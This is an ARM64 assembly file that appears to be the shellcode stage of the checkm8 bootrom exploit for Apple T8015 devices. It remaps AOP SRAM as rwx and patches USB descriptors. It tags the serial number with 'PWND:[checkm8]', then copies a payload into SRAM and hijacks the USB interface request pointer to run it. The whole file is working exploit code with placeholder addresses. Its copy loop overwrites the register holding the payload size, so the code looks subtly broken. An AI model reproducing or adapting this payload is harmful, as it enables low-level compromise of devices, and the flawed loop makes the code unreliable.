.text

.pool
.set PAYLOAD_OFFSET,               0xBAD00006
.set PAYLOAD_SIZE,                 0xBAD00007
.set PAYLOAD_DEST,                 0xBAD00005
.set PAYLOAD_PTR,                  0xBAD00008
.set gUSBSerialNumber,             0xBAD00002
.set gUSBSRNMStringDescriptor,     0xBAD00004
.set gUSBDescriptors,              0xBAD00001
.set usb_create_string_descriptor, 0xBAD00003

.global _main
_main:
  MOV  X19, #0                      // HACK: do not free this usb request
  STP  X29, X30, [SP,#-0x10]!
  MOV  X29, SP

    /* Bring up AOP SRAM. T8015 */
    mov x0, #0x200000000
    mov x2, x0
    movk x0, #0x00f8
    movk x0, #0x3528, lsl #16
    mov w1, #0xf
    str w1, [x0]

Lnotup:
    ldr w1, [x0]
    mvn w1, w1
    tst w1, #0xf0
    b.ne Lnotup

    /* Translate VA 0x934e00000 to PA 0x234e00000. This way we have an
    rwx view of AOP SRAM we can run our code off of */
    /* Change the L2 TTE for AOP SRAM to be rwx so we have an identity
    map for when we bring up cpu5 */
    mov x0, #0x180000000
    ; movk x0, #0xe4d0
    movk x0, #0xc8d0
    ; movk x2, #0x621
    movk x2, #0x421
    ; movk x2, #0x425
    movk x2, #0x3400, lsl #16
    str x2, [x0]

    dsb sy
    isb sy
    tlbi vmalle1
    isb sy

  LDR  X0, =gUSBDescriptors
  LDP  X0, X1, [X0]
  ADR  X2, USB_DESCRIPTOR

    ; ldp q0, q1, [x2]
    ; stp q0, q1, [x0]
    ; stp q0, q1, [x1]
  LDP  X3, X4, [X2]
  STP  X3, X4, [X0]
  STP  X3, X4, [X1]
  LDP  X3, X4, [X2,#0x10]
  STP  X3, X4, [X0,#0x10]
  STP  X3, X4, [X1,#0x10]

  LDR  X0, =gUSBSerialNumber

Lfind_zero_loop:
  ADD  X0, X0, #1
  LDRB W1, [X0]
  CBNZ W1, Lfind_zero_loop

  ADR  X1, PWND_STRING
  LDP  X2, X3, [X1]
  STP  X2, X3, [X0]

  LDR  X0, =gUSBSerialNumber
  LDR  X1, =usb_create_string_descriptor
  BLR  X1

  LDR  X1, =gUSBSRNMStringDescriptor
  STRB W0, [X1]

  LDR  X0, =PAYLOAD_DEST
  ADR  X1, _main
  LDR  X2, =PAYLOAD_OFFSET
  ADD  X1, X1, X2
  MOV  X2, #0
  LDR  X3, =PAYLOAD_SIZE
  LDR  X4, =PAYLOAD_PTR
  ADD  X5, X0, #0x18
  STR  X5, [X4]         ; XXX set interface request pointer to our code

Lcopy_loop:
    ldp x3, x4, [x1], #0x10
    stp x3, x4, [x0], #0x10
    dc civac, x0
    add x2, x2, #0x10
    cmp x2, x3
    b.lo Lcopy_loop


; Lcopy_loop:
;   LDP  X3, X4,  [X1]
;   STP  X3, X4,  [X0]
;   DC   CIVAC, X0
;   DMB  SY
;   ADD  X0, X0, #0x10
;   ADD  X1, X1, #0x10
;   ADD  X2, X2, #0x10
;   CMP  X2, X3
;   B.CC Lcopy_loop

  SYS  #0, c7, c5, #0
  DSB  SY
  ISB

  LDP  X29, X30, [SP],#0x10
  RET

USB_DESCRIPTOR:
.word 0x190209, 0x80050101, 0x409fa, 0x1fe0000, 0x21070000, 0xa01, 0x8, 0x0

PWND_STRING:
.asciz " PWND:[checkm8]"
